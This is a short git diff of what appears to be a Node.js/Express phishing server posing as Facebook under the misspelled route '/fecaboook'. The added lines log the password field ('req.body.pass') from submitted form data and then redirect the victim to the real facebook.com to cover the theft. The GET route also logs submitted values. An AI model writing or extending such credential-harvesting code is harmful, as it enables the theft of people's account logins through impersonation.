@@ -27,16 +27,15 @@ app.get('/', (req, res, next) => {
 app.post('/fecaboook', (req, res, next) => {
     console.log('redirect to facebook with POST method');
     console.log(JSON.stringify(req.body));
-    console.log(req);
+    console.log(req.body.pass);
 
-    res.sendFile(__dirname + '/faceboook.html');
-    //res.redirect('http://www.facebook.com');
+    res.redirect('http://www.facebook.com');
 });
 
 app.get('/fecaboook', (req, res, next) => {
     console.log('redirect to facebook with GET method');
     console.log(JSON.stringify(req.query));
-    console.log(req);
+    console.log(req.body);
     
     res.redirect('http://www.facebook.com');
 });
